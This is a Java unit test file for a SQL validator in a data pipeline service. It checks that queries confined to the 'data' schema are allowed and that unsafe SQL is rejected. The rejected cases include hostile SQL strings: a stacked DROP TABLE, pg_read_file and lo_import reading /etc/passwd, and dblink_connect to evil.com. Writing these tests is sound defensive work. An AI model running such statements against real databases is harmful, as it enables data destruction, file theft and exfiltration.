package com.smartfirehub.pipeline.service.validator;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.smartfirehub.pipeline.exception.UnsafeSqlException;
import org.junit.jupiter.api.Test;

class SqlValidatorTest {

  private final SqlValidator validator = new SqlValidator();

  // --- 허용되는 구문 ---

  @Test
  void allows_simple_select_on_data_schema() {
    assertThatCode(() -> validator.validate("SELECT * FROM data.t")).doesNotThrowAnyException();
  }

  @Test
  void allows_select_with_where_order() {
    assertThatCode(() -> validator.validate("SELECT a, b FROM data.t WHERE c > 1 ORDER BY a"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_insert_select_within_data_schema() {
    assertThatCode(() -> validator.validate("INSERT INTO data.t (a, b) SELECT a, b FROM data.s"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_update_on_data_schema() {
    assertThatCode(() -> validator.validate("UPDATE data.t SET a = 1 WHERE id = 2"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_delete_on_data_schema() {
    assertThatCode(() -> validator.validate("DELETE FROM data.t WHERE id = 2"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_cte_referencing_only_data_schema() {
    assertThatCode(
            () ->
                validator.validate(
                    "WITH cte AS (SELECT id, x FROM data.s) "
                        + "SELECT t.id, cte.x FROM data.t JOIN cte USING (id)"))
        .doesNotThrowAnyException();
  }

  @Test
  void allows_trailing_semicolon() {
    assertThatCode(() -> validator.validate("SELECT * FROM data.t;")).doesNotThrowAnyException();
  }

  // --- 거부되는 구문 ---

  @Test
  void rejects_multiple_statements() {
    assertThatThrownBy(() -> validator.validate("SELECT 1; SELECT 2"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("멀티 스테이트먼트");
  }

  @Test
  void rejects_statement_appended_after_select() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM data.t; DROP TABLE data.t"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_public_schema_reference() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM public.\"user\""))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("data");
  }

  @Test
  void rejects_information_schema_reference() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM information_schema.tables"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("data");
  }

  @Test
  void rejects_unqualified_table_reference() {
    assertThatThrownBy(() -> validator.validate("SELECT * FROM t"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("스키마");
  }

  @Test
  void rejects_cte_with_public_reference_inside() {
    assertThatThrownBy(
            () ->
                validator.validate("WITH cte AS (SELECT * FROM public.\"user\") SELECT * FROM cte"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("data");
  }

  @Test
  void rejects_drop_statement() {
    assertThatThrownBy(() -> validator.validate("DROP TABLE data.t"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_truncate_statement() {
    assertThatThrownBy(() -> validator.validate("TRUNCATE data.t"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_do_block() {
    assertThatThrownBy(() -> validator.validate("DO $$ BEGIN END $$"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_pg_read_file_in_select() {
    assertThatThrownBy(() -> validator.validate("SELECT pg_read_file('/etc/passwd')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("pg_read_file");
  }

  @Test
  void rejects_dblink_in_select() {
    assertThatThrownBy(() -> validator.validate("SELECT dblink_connect('host=evil.com dbname=x')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("dblink_connect");
  }

  @Test
  void rejects_lo_import_in_select() {
    assertThatThrownBy(() -> validator.validate("SELECT lo_import('/etc/passwd')"))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("lo_import");
  }

  @Test
  void rejects_garbage_input() {
    assertThatThrownBy(() -> validator.validate("not a sql"))
        .isInstanceOf(UnsafeSqlException.class);
  }

  @Test
  void rejects_null() {
    assertThatThrownBy(() -> validator.validate(null))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("비어");
  }

  @Test
  void rejects_blank() {
    assertThatThrownBy(() -> validator.validate("   "))
        .isInstanceOf(UnsafeSqlException.class)
        .hasMessageContaining("비어");
  }
}
